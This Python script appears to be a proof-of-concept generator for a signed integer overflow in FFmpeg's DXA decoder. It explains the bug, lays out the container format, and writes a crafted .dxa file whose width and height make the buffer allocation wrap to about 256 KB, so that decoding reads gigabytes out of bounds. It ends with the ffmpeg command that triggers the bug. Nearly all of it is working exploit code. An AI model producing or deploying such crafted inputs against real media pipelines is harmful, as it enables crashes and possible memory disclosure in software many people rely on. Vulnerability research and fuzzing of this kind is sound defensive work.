#!/usr/bin/env python3
"""
PoC generator for integer overflow in DXA decode_init (vuln_001).

Vulnerability:
  In libavcodec/dxa.c decode_init():
    c->dsize = avctx->width * avctx->height * 2;   // signed int32 overflow!
    c->decomp_buf = av_malloc(c->dsize + DECOMP_BUF_PADDING);

  With width=65532 and height=32772:
    65532 * 32772 * 2 = 4295229408 > INT32_MAX
    As int32 (two's complement wrapping): 4295229408 - 2^32 = 262112
    So c->dsize = 262112 and decomp_buf is only ~256 KB.

  In decode_frame() with compr=4 (raw uncompressed, no zlib decompression):
    srcptr = c->decomp_buf        <- only 256 KB
    for j in range(height):       <- 32772 iterations
        memcpy(outptr, srcptr, width)   <- 65532 bytes each
        srcptr += width
    Total bytes read from decomp_buf: 32772 * 65532 = ~2.1 GB >> 256 KB
    => Massive heap OOB read, detected by ASAN.

DXA container format (from libavformat/dxa.c dxa_read_header):
  [0..3]  : 'DEXA'    magic (read as RL32 = little-endian, so bytes D,E,X,A)
  [4]     : flags      (1 byte)
  [5..6]  : frames     (BE16)
  [7..10] : fps        (BE32)
  [11..12]: width      (BE16)
  [13..14]: height     (BE16)
  Then: optional WAVE chunk, then frame chunks.

Frame chunk (from dxa_read_packet):
  CMAP: 'CMAP' (4 bytes) + 768 bytes palette
  FRAM: 'FRAM' (4 bytes) + compr_byte (1) + size_BE32 (4) + <size> bytes data

With -f dxa (forced format), the probe width/height cap of 2048 is bypassed.
"""
import struct

width  = 65532   # 0xFFFC as uint16
height = 32772   # 0x8004 as uint16

# Simulate the int32 overflow
raw = (width * height * 2) & 0xFFFFFFFF
if raw >= 0x80000000:
    dsize_signed = raw - 0x100000000
else:
    dsize_signed = raw

print(f"width        = {width} (0x{width:04X})")
print(f"height       = {height} (0x{height:04X})")
print(f"width*height*2 = {width * height * 2}")
print(f"c->dsize (int32 wrapped) = {dsize_signed}")
print(f"decomp_buf size (av_malloc) = {max(dsize_signed, 0) + 16} bytes")
print(f"bytes the rendering loop reads = {width * height} bytes (~{width*height // (1024*1024)} MB)")
print()

assert width  % 4 == 0, "width must be multiple of 4 (checked in decode_init)"
assert height % 4 == 0, "height must be multiple of 4 (checked in decode_init)"
assert width  <= 0xFFFF
assert height <= 0xFFFF

# ----------------------------------------------------------------
# Build the DXA file
# ----------------------------------------------------------------
buf = bytearray()

# -- DXA container header (15 bytes) --
buf += b'DEXA'                       # magic tag (bytes: D E X A)
buf += struct.pack('B', 0x00)        # flags = 0 (no interlace/double-height)
buf += struct.pack('>H', 1)          # frames = 1
buf += struct.pack('>I', 10)         # fps = 10 ms per frame
buf += struct.pack('>H', width)      # width  (big-endian 16-bit)
buf += struct.pack('>H', height)     # height (big-endian 16-bit)
# Next 4 bytes will be read as potential WAVE tag:
#   avio_rl32 == MKTAG('W','A','V','E')?  No -> no audio branch.

# -- CMAP palette chunk --
# Provides a palette so frame->data[1] memcpy in decode_frame succeeds
buf += b'CMAP'                       # tag
buf += b'\x00' * 768                 # 256 colors * 3 bytes (R,G,B) = black

# -- FRAM frame chunk --
# compr = 4: decoder uses decomp_buf directly, skips zlib uncompress.
# size = 0:  no compressed payload needed (compr=4 path doesn't read packet data).
buf += b'FRAM'                       # tag
buf += struct.pack('B', 0x04)        # compr = 4 (raw, no decompression)
buf += struct.pack('>I', 0)          # compressed size = 0

out = 'vuln_001_input.dxa'
with open(out, 'wb') as f:
    f.write(buf)

print(f"Written {len(buf)} bytes to {out}")
print("Trigger: ffmpeg -f dxa -i vuln_001_input.dxa -f null -")
